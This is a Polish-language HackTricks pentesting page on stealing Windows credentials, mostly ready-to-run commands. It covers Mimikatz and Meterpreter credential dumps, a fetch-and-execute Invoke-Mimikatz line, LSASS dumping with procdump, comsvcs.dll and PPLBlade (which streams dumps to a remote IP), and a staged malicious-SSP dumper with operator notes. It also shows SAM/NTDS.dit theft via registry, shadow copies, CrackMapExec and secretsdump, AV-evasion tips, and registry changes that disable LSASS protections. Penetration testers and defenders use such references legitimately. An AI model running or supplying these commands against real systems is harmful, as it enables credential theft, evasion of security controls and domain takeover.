# Kradzież poświadczeń Windows

{{#include ../../banners/hacktricks-training.md}}

## Poświadczenia Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Znajdź inne rzeczy, które Mimikatz może zrobić na** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Dowiedz się o możliwych zabezpieczeniach credentials tutaj.**](credentials-protections.md) **Te zabezpieczenia mogą uniemożliwić Mimikatzowi wydobycie niektórych credentials.**

## Credentials z Meterpreter

Użyj [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **który** stworzyłem, aby **search for passwords and hashes** w systemie ofiary.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Omijanie AV

### Procdump + Mimikatz

Ponieważ **Procdump z** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**jest oficjalnym narzędziem Microsoftu**, nie jest wykrywany przez Defender.\
Możesz użyć tego narzędzia, aby **dump procesu lsass**, **pobrać dump** i **wyodrębnić** **credentials lokalnie** z dumpu.

Możesz też użyć [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ten proces jest wykonywany automatycznie za pomocą [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Uwaga**: Niektóre **AV** mogą uznać za **złośliwe** użycie **procdump.exe to dump lsass.exe**, dzieje się tak, ponieważ wykrywają ciągi **"procdump.exe" i "lsass.exe"**. Dlatego bardziej stealthowe jest przekazanie jako **argumentu** **PID** procesu lsass.exe do procdump **zamiast** nazwy lsass.exe.

### Zrzucanie pamięci procesu lsass przy użyciu **comsvcs.dll**

DLL o nazwie **comsvcs.dll** znajdujący się w `C:\Windows\System32` odpowiada za **zrzucanie pamięci procesów** w przypadku awarii. Ta DLL zawiera **funkcję** o nazwie **`MiniDumpW`**, zaprojektowaną do wywoływania przy użyciu `rundll32.exe`.\
Pierwsze dwa argumenty nie mają znaczenia, natomiast trzeci dzieli się na trzy części. Pierwszą częścią jest **PID** procesu do zrzutu, drugą — lokalizacja pliku zrzutu, a trzecią jest ściśle słowo **full**. Nie ma innych opcji.\
Po sparsowaniu tych trzech części, DLL przystępuje do tworzenia pliku zrzutu i zapisuje do niego pamięć wskazanego procesu.\
Wykorzystanie **comsvcs.dll** jest możliwe do zrzutu procesu lsass, co eliminuje konieczność przesyłania i uruchamiania procdump. Metoda jest opisana szczegółowo na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Do wykonania używa się następującego polecenia:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Możesz zautomatyzować ten proces za pomocą** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Zrzucanie lsass przy użyciu Task Manager**

1. Kliknij prawym przyciskiem myszy na Task Bar i wybierz Task Manager
2. Kliknij More details
3. Wyszukaj proces "Local Security Authority Process" na karcie Processes
4. Kliknij prawym przyciskiem na proces "Local Security Authority Process" i wybierz "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) jest binarką podpisaną przez Microsoft, będącą częścią zestawu [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Zrzucanie lsass przy użyciu PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) jest Protected Process Dumper Tool, który obsługuje obfuscating memory dump oraz przesyłanie ich na zdalne stacje robocze bez zapisywania na dysku.

**Kluczowe funkcje**:

1. Omijanie ochrony PPL
2. Obfuscating memory dump files w celu uniknięcia mechanizmów wykrywania opartych na sygnaturach Defendera
3. Wysyłanie memory dump przy użyciu metod RAW i SMB bez zapisywania na dysku (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon zawiera trzystopniowy dumper o nazwie **LalsDumper**, który nigdy nie wywołuje `MiniDumpWriteDump`, więc EDR hooks na tym API nigdy się nie uruchamiają:

1. **Stage 1 loader (`lals.exe`)** – przeszukuje `fdp.dll` w poszukiwaniu placeholdera składającego się z 32 małych znaków `d`, nadpisuje go absolutną ścieżką do `rtu.txt`, zapisuje załatany DLL jako `nfdp.dll` i wywołuje `AddSecurityPackageA("nfdp","fdp")`. To zmusza **LSASS** do załadowania złośliwego DLL jako nowego Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – gdy LSASS ładuje `nfdp.dll`, DLL odczytuje `rtu.txt`, XORuje każdy bajt z `0x20` i mapuje zdekodowany blob do pamięci przed przekazaniem wykonania.
3. **Stage 3 dumper** – zmapowany payload ponownie implementuje logikę MiniDump, używając **direct syscalls** rozwiązywanych z zahaszowanych nazw API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Dedykowany eksport o nazwie `Tom` otwiera `%TEMP%\<pid>.ddt`, zapisuje do pliku skompresowany zrzut LSASS i zamyka uchwyt, umożliwiając późniejszą exfiltrację.

Uwagi operatora:

* Trzymaj `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` w tym samym katalogu. Stage 1 nadpisuje hard-coded placeholder absolutną ścieżką do `rtu.txt`, więc podzielenie ich łamie łańcuch.
* Rejestracja odbywa się poprzez dopisanie `nfdp` do `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Możesz ustawić tę wartość samodzielnie, żeby LSASS przeładował SSP przy każdym uruchomieniu.
* Pliki `%TEMP%\*.ddt` to skompresowane zrzuty. Dekompresuj lokalnie, a następnie przekaż je do Mimikatz/Volatility w celu wydobycia poświadczeń.
* Uruchomienie `lals.exe` wymaga uprawnień admin/SeTcb, aby `AddSecurityPackageA` zakończyło się sukcesem; po powrocie wywołania LSASS transparentnie ładuje złośliwy SSP i wykonuje Stage 2.
* Usunięcie DLL z dysku nie usuwa go z pamięci LSASS. Usuń wpis w rejestrze i zrestartuj LSASS (reboot) lub pozostaw go dla długotrwałej persystencji.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump NTDS.dit z docelowego DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Zrzut historii haseł NTDS.dit z docelowego DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Wyświetl atrybut pwdLastSet dla każdego konta w NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Kradzież SAM & SYSTEM

Te pliki powinny znajdować się w _C:\windows\system32\config\SAM_ oraz _C:\windows\system32\config\SYSTEM_. Jednak **nie można ich po prostu skopiować w zwykły sposób**, ponieważ są chronione.

### Z rejestru

Najprostszy sposób na pozyskanie tych plików to uzyskanie ich kopii z rejestru:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Pobierz** te pliki na swoją maszynę Kali i **wyodrębnij hashes** używając:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Możesz wykonać kopiowanie chronionych plików przy użyciu tej usługi. Musisz być Administratorem.

#### Using vssadmin

Plik binarny vssadmin jest dostępny tylko w wersjach Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ale możesz zrobić to samo z **Powershell**. Oto przykład **jak skopiować SAM file** (używany dysk to "C:", a plik jest zapisany w C:\users\Public), ale możesz użyć tego do kopiowania dowolnego chronionego pliku:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kod z książki: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Wreszcie możesz również użyć [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) aby skopiować SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Poświadczenia Active Directory - NTDS.dit**

Plik **NTDS.dit** jest uważany za serce **Active Directory**, przechowując kluczowe dane o obiektach użytkowników, grupach i ich członkostwach. To tam przechowywane są **hashe haseł** dla użytkowników domeny. Ten plik jest bazą danych **Extensible Storage Engine (ESE)** i znajduje się w **_%SystemRoom%/NTDS/ntds.dit_**.

W tej bazie danych utrzymywane są trzy główne tabele:

- **Data Table**: Ta tabela przechowuje szczegóły dotyczące obiektów takich jak użytkownicy i grupy.
- **Link Table**: Śledzi relacje, na przykład członkostwa w grupach.
- **SD Table**: **deskryptory bezpieczeństwa** dla każdego obiektu są przechowywane tutaj, zapewniając bezpieczeństwo i kontrolę dostępu do przechowywanych obiektów.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows używa _Ntdsa.dll_ do interakcji z tym plikiem, a jest on używany przez _lsass.exe_. W związku z tym **część** pliku **NTDS.dit** może znajdować się **wewnątrz pamięci `lsass`** (można znaleźć najświeżej dostępne dane prawdopodobnie ze względu na poprawę wydajności przez użycie **cache**).

#### Odszyfrowywanie hashy wewnątrz NTDS.dit

Hash jest szyfrowany 3 razy:

1. Odszyfruj Password Encryption Key (**PEK**) używając **BOOTKEY** i **RC4**.
2. Odszyfruj ten **hash** używając **PEK** i **RC4**.
3. Odszyfruj **hash** używając **DES**.

**PEK** ma **tę samą wartość** w **każdym domain controller**, ale jest **zaszyfrowany** wewnątrz pliku **NTDS.dit** używając **BOOTKEY** pliku **SYSTEM** kontrolera domeny (jest inny między kontrolerami domeny). Dlatego aby uzyskać poświadczenia z pliku NTDS.dit **potrzebujesz plików NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kopiowanie NTDS.dit przy użyciu Ntdsutil

Dostępne od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Możesz też użyć sztuczki [**volume shadow copy**](#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że będziesz także potrzebować kopii **SYSTEM file** (ponownie, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) sztuczki).

### **Wyodrębnianie hashes z NTDS.dit**

Gdy już **uzyskasz** pliki **NTDS.dit** i **SYSTEM**, możesz użyć narzędzi takich jak _secretsdump.py_ aby **wyodrębnić hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Możesz je również **wydobyć automatycznie** używając ważnego użytkownika z rolą domain admin:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Dla **dużych plików NTDS.dit** zaleca się ich wyodrębnienie za pomocą [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Na koniec można też użyć **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ lub **mimikatz** `lsadump::lsa /inject`

### **Wyodrębnianie obiektów domeny z NTDS.dit do bazy SQLite**

Obiekty NTDS można wyeksportować do bazy SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Nie są wyodrębniane jedynie sekrety — eksportowane są również całe obiekty i ich atrybuty, co pozwala na dalsze pozyskiwanie informacji, gdy surowy plik NTDS.dit został już pobrany.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive jest opcjonalny, ale umożliwia odszyfrowanie sekretów (NT & LM hashes, supplemental credentials takie jak cleartext passwords, kerberos lub trust keys, NT & LM password histories). Wraz z innymi informacjami wydobywane są następujące dane: konta użytkowników i komputerów wraz z ich hashami, flagi UAC, znaczniki czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i rekursywne członkostwa, drzewo jednostek organizacyjnych i członkostwo, trusted domains with trusts type, direction and attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). Możesz użyć tego binary, aby wyodrębnić credentials z kilku aplikacji.
```
lazagne.exe all
```
## Inne narzędzia do wyodrębniania poświadczeń z SAM i LSASS

### Windows credentials Editor (WCE)

To narzędzie służy do wyodrębniania poświadczeń z pamięci. Pobierz je z: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Wyodrębnia poświadczenia z pliku SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Wyodrębnij poświadczenia z pliku SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Pobierz go z:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i po prostu **uruchom** a hasła zostaną wyekstrahowane.

## Mining idle RDP sessions and weakening security controls

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – przeanalizuj każdy hive użytkownika w `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Każdy podklucz przechowuje nazwę serwera, `UsernameHint` i znacznik czasu ostatniego zapisu. Możesz odtworzyć logikę FinalDraft przy użyciu PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – zapytaj dziennik `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` o Event IDs **21** (pomyślne logowanie) i **25** (rozłączenie), aby odwzorować, kto administrował maszyną:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Gdy już wiesz, który Domain Admin łączy się regularnie, zrzutuj LSASS (za pomocą LalsDumper/Mimikatz) gdy ich **rozłączona** sesja nadal istnieje. CredSSP + NTLM fallback pozostawia ich verifier i tokeny w LSASS, które można potem odtworzyć przez SMB/WinRM, aby zdobyć `NTDS.dit` lub osadzić utrwalenie na kontrolerach domeny.

### Registry downgrades targeted by FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Ustawienie `DisableRestrictedAdmin=1` wymusza pełne ponowne użycie poświadczeń/biletów podczas RDP, umożliwiając pivots w stylu pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` wyłącza filtrowanie tokenów UAC, więc lokalni administratorzy otrzymują nieograniczone tokeny w sieci.
* `DSRMAdminLogonBehavior=2` pozwala administratorowi DSRM logować się, gdy DC jest online, dając atakującym kolejne wbudowane konto o wysokich uprawnieniach.
* `RunAsPPL=0` usuwa ochrony LSASS PPL, ułatwiając dostęp do pamięci dla dumpers takich jak LalsDumper.

## Odniesienia

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
